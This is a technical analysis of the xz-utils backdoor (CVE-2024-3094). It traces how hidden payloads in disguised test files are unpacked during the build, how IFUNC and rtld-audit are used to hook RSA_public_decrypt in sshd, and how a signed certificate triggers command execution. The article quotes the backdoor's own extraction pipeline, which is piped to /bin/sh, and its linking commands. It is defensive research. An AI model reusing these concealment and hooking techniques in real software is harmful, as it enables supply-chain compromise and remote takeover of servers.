Analysis of the xz-utils backdoor code

##
#
https://medium.com/@knownsec404team/analysis-of-the-xz-utils-backdoor-code-d2d5316ac43f
#
##




Author: 0x7F @ Knownsec 404 Team
Chinese version: https://paper.seebug.org/3157/

1 Introduction
xz-utils is a data compression/decompression tool that utilizes the LZMA algorithm. Files compressed with xz-utils typically have the extension *.xz, making it one of the widely used compression formats on Linux.

On March 29, 2024, Microsoft engineer Andres Freund disclosed a backdoor vulnerability in the open-source project xz-utils, identified as CVE-2024–3094. This vulnerability, facilitated through a supply chain attack, hijacks the identity authentication logic of the sshd service, enabling authentication bypass and remote command execution. The backdoor affects versions of liblzma.so 5.6.0 and 5.6.1, impacting various mainstream Linux distributions including Debian, Ubuntu, Fedora, CentOS, RedHat, and OpenSUSE. Specifically, the affected versions primarily include testing and experimental versions of these distributions.

As of the publication of this article, a significant amount of high-quality analysis reports have been published by global security researchers on the internet regarding the xz-utils backdoor disclosure. These reports contribute to a comprehensive understanding of the xz-utils backdoor incident. Building upon these analysis reports, this article will translate, organize, and replicate findings. It will focus on analyzing and researching the xz-utils backdoor code section to understand the attackers’ technical approach and implementation details. This aims to provide some technical support from a defensive standpoint.

Experimental Environment of This Article：

Debian 12 x64
xz-utils/liblzma.so 5.6.1
IDA / GDB
2 Summary of the xz-utils Backdoor
The xz-utils source code is hosted on Github. Based on the commit history related to the backdoor code, the attacker is identified as Github user JiaT75. They spent nearly two years infiltrating the xz-utils project, continuously contributing code (with the earliest traceable submission dated back to February 7, 2022). Eventually, they obtained direct maintenance permissions for the xz-utils repository, laying the groundwork for building the backdoor.

The attacker targeted the backdoor towards the sshd service, enabling it to achieve greater attack effectiveness while maintaining stealth. However, by default, there is no direct connection between the sshd service and xz-utils. Some Linux distributions (such as Debian) introduced a dependency on libsystemd0 in openssh-server. This dependency facilitates communication between the sshd process and the systemd daemon. Additionally, libsystemd0 depends on liblzma5. Consequently, a feasible pathway was established for constructing the backdoor, as follows:


Figure 2–1: Indirect Dependency of sshd on liblzma5
In the “certificate verification” identity authentication logic of the sshd service, the critical function RSA_public_decrypt()* is used to verify the signature of data sent by the user using a public key. Successful signature verification indicates successful authentication. The attacker then hijacks and replaces the RSA_public_decrypt()* function using liblzma5. Within the replaced function, the attacker embeds their own public key and provides a command for execution after successful authentication, thereby implementing the backdoor.


Figure 2–2: Identity Authentication Function RSA_public_decrypt()
To achieve the hijack replacement of the RSA_public_decrypt()* function while maintaining concealment and compatibility of the entire process, the attacker employed a highly complex implementation scheme. The specific implementation process can be roughly divided into three stages:

liblzma5 Compilation Phase: The attacker concealed the backdoor code within the xz-utils source code and modified the compilation script to add the backdoor code to the liblzma5.so library during compilation.
sshd Startup Phase: During sshd startup, the liblzma5.so library is indirectly loaded. The attacker utilizes the IFUNC and rtdl-audit mechanisms to achieve hijack replacement of the RSA_public_decrypt()*function.
RSA_public_decrypt()*Backdoor Activation Phase: The attacker signs the certificate with a private key and uses the certificate to authenticate with the sshd service, triggering theRSA_public_decrypt()*.
The implementation process is as follows:


Figure 2–3: Overview of the Backdoor Implantation Process
In the following sections, we will focus on analyzing the specific implementation processes of these three stages.

3 Analysis of Environment Configuration
First, we set up the analysis environment. Due to the disclosure of the xz-utils backdoor incident, various Linux distributions have rolled back versions of xz-utils/liblzma.so to mitigate the impact. Additionally, the attacker distributed the project source code containing the backdoor code only in the tarball (inconsistent with the code on the Github project homepage), thereby increasing the stealthiness of the backdoor code）.

Therefore, we need to specify the commit in downstream distributions to obtain the source code containing the backdoor (xz-utils-debian), or download the xz-utils tarball source code via web-archive.

After downloading and extracting the source code, compile the xz-utils project using the following command:

# [xz-utils] source directory
$ ./configure
$ make
After successful compilation, the target binary file [src]/src/liblzma/.libs/liblzma.so.5.6.1 will be generated. The liblzma5.so containing the backdoor code has a significantly larger size compared to the normal version, as follows:


Figure 3–1: Compilation of liblzma5.so and Comparison
4 Compilation Script Phase
The attacker concealed the backdoor code within the xz-utils source code and manipulated the compilation script’s execution to inject the backdoor code into the liblzma5.so library during the compilation process. This step serves as the entry point for backdoor implantation and marks the starting point of the entire attack process at the code level. A schematic diagram of the process is provided below:


Figure 4–1: Flowchart of Compilation Script Phase
1.build-to-host.m4

First, we focus on the backdoor compilation script [src]/m4/build-to-host.m4 file .This is an m4 macro file that will be macro-expanded and executed along with the configure && make command. The code of AC_DEFUN(gl_BUILD_TO_HOST_INIT) will be executed first.


Figure 4–2 ：Creation of Backdoor File by build-to-host Script
Here, a grep command is used to search for backdoor files with content matching the feature #{4}[[:alnum:]]{5}#{4}$, specifically [src]/tests/files/bad-3-corrupt_lzma2.xz. The test execution as follows:"


Figure 4–3: Search for the backdoor file bad-3-corrupt_lzma2.xz
2.bad-3-corrupt_lzma2.xz

Partial execution of the code AC_DEFUN(gl_BUILD_TO_HOST). Here, the system environment is first checked and modified, followed by extraction of file content from the backdoor file bad-3-corrupt_lzma2.xz. Key code snippets are as follows:


Figure 4–4: Extraction of content from bad-3-corrupt_lzma2.xz
In context, the actual execution of the line of code is as follows: using the sed command to read the content of the bad-3-corrupt_lzma2.xz file, utilizing the tr command to replace corresponding characters according to the mapping [\t -*] => [ \t*-], and additionally employing the xz command for decompression.

sed "r\n" bad-3-corrupt_lzma2.xz | tr "\t \-_" " \t_\-" | xz -d
After decompression, you will obtain a bash script file named helloworld.sh, with the following content:


Figure 4–5: Script Extracted from bad-3-corrupt_lzma2.xz
Here, the build-to-host command is registered using AC_CONFIG_COMMANDS. Subsequently, calling this command will execute the code eval $gl_config_gt, which refers to the helloworld.sh script file.

3.good-large_compressed.lzma

The helloworld.sh script similarly begins with environment checks and uses the xz command to decompress the backdoor file[src]/tests/files/good-large_compressed.lzma. It then employs theheadandtail commands to extract parts of the file content, followed by the tr command to replace characters in the command content. Finally, it uses the xz command to decompress the tested file. The key commands are organized as follows:

xz -dc $srcdir/tests/files/good-large_compressed.lzma |
eval $i |
tail -c +31233 |
tr "\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113" "\0-\377") |
xz -F raw --lzma1 -dc |
/bin/sh
Here, decompression using the command xz -F raw --lzma1 -dc results in a new bash script file named decompressed.sh.

4.decompressed.sh

The code in decompressed.sh script is quite extensive, primarily focusing on environment checks and compatibility adjustments. The most critical code comprises three segments. The first segment of code is as follows:


Figure 4–6: Pre-embedded Code in the Decompressed .sh Script
Still following familiar operations, usinggrep to search for matching content in the source code folder, extracting content with the cut command, replacing characters with the trcommand, and finally decompressing using the xz command. However, we didn't find any files matching the criteria in the source code folder. This could be code pre-embedded by attackers for future attacks.

In the script, the code at grep -broaF 'jV!.^%' $top_srcdir/tests/files/ 2>/dev/null operates similarly.

5.liblzma_la-crc64-fast.o

The target binary file generated by the second segment of code is liblzma_la-crc64-fast.o, as follows:


Figure 4–7: Generation of liblzma_la-crc64-fast.o by the Decompressed .sh Script
Here, $p=good-large_compressed.lzma, and $i represents the code for extracting file content using the head command earlier. The extracted content is then decrypted using RC4 to obtain a compressed file, which is eventually decompressed by the xz command to obtain the target binary file liblzma_la-crc64-fast.o, as follows:


Figure 4–8: Information about the file liblzma_la-crc64-fast.o
6.crc64_fast.c

The third segment of code modifies the source code crc64_fast.cby adding the entry code for the backdoor here, as follows:


Figure 4–9: Modification of crc64_fast.c Source Code by the decompressed.sh Script
Here, crc32_fast.c is not further elaborated upon to ensure better compatibility.

Using the diff command to view the modifications made to the source code crc64_fast.c, as follows:


Figure 4–10: Modification of crc64_fast.c Source Code
The comparison of the code reveals that the attacker replaced the original function is_arch_extension_supported() with _is_arch_extension_supported(). Within the inline function _is_arch_extension_supported(), an external function _get_cpuid() is invoked.

The external function _get_cpuid() is hidden within liblzma_la-crc64-fast.o. The attacker employs the following compilation command to integrate the backdoor binary file liblzma_la-crc64-fast.oand the modified crc64_fast.c source code into the original target file liblzma_la-crc64_fast.o (note the slight difference in underscores):

$CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS $CFLAGS -r liblzma_la-crc64-fast.o -x c -  $P -o .libs/liblzma_la-crc64_fast.o 2>/dev/null
In comparison to the normal version of liblzma_la-crc64_fast.o, we can observe a significant size difference:


Figure 4–11: Comparison of liblzma_la-crc64_fast.o
Subsequently, the liblzma_la-crc64_fast.o containing the backdoor code will naturally be compiled and linked into the library file liblzma5.so, completing the implantation of the backdoor.

5 SSHD startup process
When the SSHD service is started, it indirectly loads the liblzma5.so library. The hijacking and replacement of the RSA_public_decrypt()* function are achieved through the IFUNC and rtdl-audit mechanisms, serving as the entry point for the backdoor execution. The schematic diagram of the process is as follows:


Figure 5–1: Flowchart of SSHD Startup Process
We can utilize LD_PRELOAD/LD_LIBRARY_PATH to specify that SSHD loads the malicious liblzma5.so library. Since the backdoor code also checks environment variables, we also need to use env -i to clear the environment variables. The complete command for dynamic debugging execution is as follows:

# cp xz-utils-5.6.1/src/liblzma/.libs/liblzma.so.5.6.1 liblzma.so.5
$ su root
$ env -i LD_LIBRARY_PATH=/home/debian/xz/ /usr/sbin/sshd -D -p 2222
Note that LD_LIBRARY_PATH needs to use an absolute path here to avoid subprocesses being unable to locate the specified malicious liblzma.so.5.

Execute as follows:


Figure 5–2: Dynamic Debugging Loading Malicious liblzma.so
1.IFUNC Function

From the analysis of the backdoor implantation process mentioned above, we can see that the entry point for the backdoor execution is located under the crc64_resolve() function in crc64_fast.c. The backdoor code is as follows:

......
lzma_resolver_attributes
static crc64_func_type
crc64_resolve(void)
{
return _is_arch_extension_supported()
            ? &crc64_arch_optimized : &crc64_generic;
}
......
#ifdef CRC_USE_IFUNC
extern LZMA_API(uint64_t)
lzma_crc64(const uint8_t *buf, size_t size, uint64_t crc)
        __attribute__((__ifunc__("crc64_resolve")));
#else
......
The lzma_crc64() is an IFUNC function that points to crc64_resolve(). IFUNC is a dynamic function implementation scheme called and bound by the dynamic loader to specific functions. This process even precedes the GDB catch load exception breakpoint, making it impossible to dynamically debug the code logic at this point using conventional breakpoints.

Here, breakpoints are set by binary patching. Using objdump -D liblzma.so.5 | grep crc64_resolve to find the function offset, we modify the first byte of the function to 0xCC to set the breakpoint. The function call stack is as follows:


Figure 5–3: Call Stack of IFUNC-crc64_resolve Function
After stopping at this point in GDB debugging, you need to manually use the commands set {char}0x7ffff74a2ea0=0x55 and set $rip=0x7ffff74a2ea0 to restore the original instruction push ebp and reset $rip, before you can proceed with normal debugging.

Analyzing the crc64_resolve() function in IDA, which is equivalent to the lzma_crc64() function, reveals that get_cpuid() serves as the entry calling point for the backdoor code, as shown below:


Figure 5–4: Code of lzma_crc64() Function
Step into the get_cpuid() function until sub_4764(), where the function modifies the address of the cpuid() function using the GOT table rewriting method. Here, the call tocpuid() actually invokes the sub_21240()/backdoor_init_stage2() function, creating a certain level of difficulty for static analysis, as follows:


Figure 5–5: Code of sub_4764() Function
2.backdoor_init_stage2

Jumping to the sub_21240()/backdoor_init_stage2() function in IDA, the key code snippet is as follows:


Figure 5–6: Code of backdoor_init_stage2() Function
Where sub_12020()/backdoor_vtbl_init() is used to initialize the global function call table for the backdoor, as follows:


Figure 5–7: Code of backdoor_vtbl_init() Function
sub_21C90()/parse_elf_init() is the main function for initializing the backdoor. It primarily hijacks and replaces target functions by parsing the ELF file format (since the function code invocation here is within the IFUNC calling lifecycle, import and export tables are not yet loaded). This function has a large amount of code, so let's analyze a few key points.

3.check_conditions

Firstly, we step into sub_12E00(), which internally calls sub_12920()/check_conditions() function for environment check. It initially verifies if the process name is /usr/sbin/sshd, and then proceeds to check the environment variables, as follows:


Figure 5–8: Code of check_conditions() Function
By analyzing the trie_getkey() table data, it checks that the environment variables cannot contain the following entries:

DISPLAY=
LD_AUDIT=
LD_BIND_NOT=
LD_DEBUG=
LD_PROFILE=
LD_USE_LOAD_BIAS=
LINES=
TERM=
WAYLAND_DISPLAY=
4.process_shared_libraries_map

Next, we step into sub_16590(), which internally calls sub_149B0()/process_shared_libraries_map() function to parse the base address of the target shared object library, as follows:


Figure 5–9: Code of process_shared_libraries_map() Function
The shared object libraries parsed by it are as follows in sequence:

sshd
ld-linux-x86-64.so
liblzma.so
libcrypto.so
libsystemd.so
libc.so
5.Register rtld-audit

The subsequent code further parses the addresses of target functions based on the shared object library. The most critical code is located at sub_21240()/backdoor_init_stage2()+0x207c, where it manually registers the auditing function symbind64() with the dynamic loader (ld.so) by constructing the audit_ifaces structure, as follows:


Figure 5–10: Constructing theaudit_ifaces structure to register the auditing function
symbind64() will be called by the dynamic loader (ld.so) every time it loads exported functions. Attackers target this moment to achieve hijacking and replacement of the target functions. Additionally, the execution timing of LD_AUDIT precedes LD_PRELOAD, which allows bypassing certain security checks.

This actually utilizes the rtld-audit mechanism, which is equivalent to writing an auditing function library in regular development. It involves defining and implementing the la_symbind64 function. In a typical usage scenario, it would be loaded using environment variables like LD_AUDIT=./audit.so ./test.

According to the above analysis, we set a breakpoint at sub_ABB0()/install_hook() during dynamic debugging. At this point, the function call stack looks like this:


Figure 5–11: Call Stack in the rtld-audit Invocation Process with the install_hook() Function
Since the rtld-audit mechanism is invoked very early, it’s challenging to set breakpoints. A simpler approach, assuming address randomization is disabled, is to run the program once, then use hbreak with the offset address of sub_ABB0() to set a hardware breakpoint. Upon rerunning, it should break accordingly.

6.install_hook

Stepping into sub_ABB0()/install_hook() function, it compares the current function name using trie_getkey() to determine if it matches the target function. If there's a match, it replaces it with the hook function, as follows:


Figure 5–12:install_hook() Function Hooking the Target Function
The attacker sets the following three hook functions here to increase the success rate. If any of these functions are successfully hooked, the process exits, and sub_CFA0() is called to clean up the traces of rtld-audit.

RSA_public_decrypt()
EVP_PKEY_set1_RSA()
RSA_get0_key()
At this point, the attacker has successfully hijacked and replaced the authentication functions, completing the installation of the backdoor code.

6 Backdoor Code Execution Phase
Although the attacker has set up three hook functions, RSA_public_decrypt() is prioritized as it is located earliest in libcrypto.so. In this analysis, we mainly focus on the code of RSA_public_decrypt_hook(). The schematic diagram of this phase is as follows:


Figure 6–1: Flowchart of Backdoor Code Execution Phase
RSA_public_decrypt() function is located within the certificate authentication process of the SSHD service. We can use the ssh-keygen command to generate and sign a certificate for testing:

# Generate test_ca public and private keys
ssh-keygen -t rsa -b 4096 -f test_ca -C test_ca
# Generate user_key public and private keys
ssh-keygen -t rsa -b 4096 -f user_key -C user_key
# Use test_ca to generate a certificate for user_key
ssh-keygen -s test_ca -I test@test.com -n test-user -V +52w user_key.pub
# View the certificate information
ssh-keygen -L -f user_key-cert.pub
# Use the certificate to authenticate with the server
ssh -i user_key-cert.pub debian@10.0.25.194 -p 2222
SSH’s three types of authentication: 1. Password authentication; 2. Public/private key authentication; 3. Certificate authentication

Using GDB to set a breakpoint at sub_164B0()/RSA_public_decrypt_hook(), and SSH client connects to the server using certificate authentication. At this point, the call stack looks like this:


Figure 6–2: Call Stack of RSA_public_decrypt_hook() Function
Stepping into the code of sub_164B0()/RSA_public_decrypt_hook(), the crucial part involves calling the main function of the backdoor code, sub_16710()/hook_main(). Afterwards, based on the execution result of the backdoor code, the original RSA_public_decrypt() function is executed as needed to revert to the normal authentication logic, as follows:


Figure 6–3: Code of RSA_public_decrypt_hook Function
In the sub_16710()/hook_main() function, firstly, it extracts key information such as n and e from the authentication message and checks the structure of the message. For instance, it verifies that the magic number calculation result from the protocol message is less than or equal to 3, which also corresponds to the values of the attack commands:


Figure 6–4: Checking the Magic Number of the Message in hook_main() Function
Then it calls sub_23650()/decrypt_ed448_public_key() function to retrieve the public key embedded in the backdoor code. The public key is encrypted using chacha20 internally, so decryption is performed here:


Figure 6–5: Code of decrypt_ed448_public_key() Function
The decrypted ED448 public key content here is:

0a 31 fd 3b 2f 1f c6 92 92 68 32 52 c8 c1 ac 28
34 d1 f2 c9 75 c4 76 5e b1 f6 88 58 88 93 3e 48
10 0c b0 6c 3a be 14 ee 89 55 d2 45 00 c7 7f 6e
20 d3 2c 60 2b 2c 6d 31 00
The backdoor code employs ChaCha20 decryption at multiple points, with the key and IV determined based on the relevant context.

Next, it calls sub_14320()/verify_ed448_signature() to verify the signature using the public key:


Figure 6–6: Calling verify_ed448_signature() for Signature Verification
After signature verification, complex condition checks are performed. Finally, at sub_16710()/hook_main()+0xb75, the system() function is called to execute a command:


Figure 6–7: Calling system to Execute a Command
7 Summary
In this document, we conducted an analysis and study of the entire lifecycle of the xz-utils backdoor code. Following the execution path of the backdoor code, we reproduced the implantation and installation process from the compilation phase of liblzma.so to the startup phase of the sshd service. Then, starting from the critical function RSA_public_decrypt(), we analyzed the execution flow and the attack intent of the backdoor code.

Through the analysis of the xz-utils backdoor code above, it is evident that the attacker possesses a high level of technical proficiency. However, this is just the tip of the iceberg. We have only scratched the surface of the main processes of the backdoor code. According to multiple technical reports found on the internet, attackers also meticulously design and implement techniques such as code obfuscation, anti-debugging measures, SSHD log hiding, and anti-disassembly engines. Additionally, beyond the code, attackers exhibit professionalism in carefully selecting targets and gaining trust through long-term infiltration and camouflage, ultimately obtaining access to code repositories. All of these aspects are worthy of further exploration and research.
```
8 References
https://github.com/tukaani-project/xz
https://www.openwall.com/lists/oss-security/2024/03/29/4
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-3094
https://mp.weixin.qq.com/s/CFuqNN36M9DgO1FAGVy5GA
https://github.com/JiaT75
https://github.com/tukaani-project/xz/commits?author=JiaT75
https://packages.debian.org/trixie/openssh-server
https://salsa.debian.org/debian/xz-utils/-/tree/46cb28adbbfb8f50a10704c1b86f107d077878e6
https://web.archive.org/web/
https://github.com/tukaani-project/xz/releases/download/
https://sourceware.org/glibc/wiki/GNU_IFUNC
https://www.agner.org/optimize/blog/read.php?i=167
https://gist.github.com/q3k/3fadc5ce7b8001d550cf553cfdc09752
https://elixir.bootlin.com/glibc/latest/source/sysdeps/generic/ldsodefs.h#L237
https://man7.org/linux/man-pages/man7/rtld-audit.7.html
https://gynvael.coldwind.pl/?lang=en&id=782
https://gist.github.com/smx-smx/a6112d54777845d389bd7126d6e9f504
https://github.com/luvletter2333/xz-backdoor-analysis
https://securelist.com/xz-backdoor-story-part-1/112354/
https://github.com/binarly-io/binary-risk-intelligence/tree/master/xz-backdoor
https://github.com/amlweems/xzbot
Xz Utils
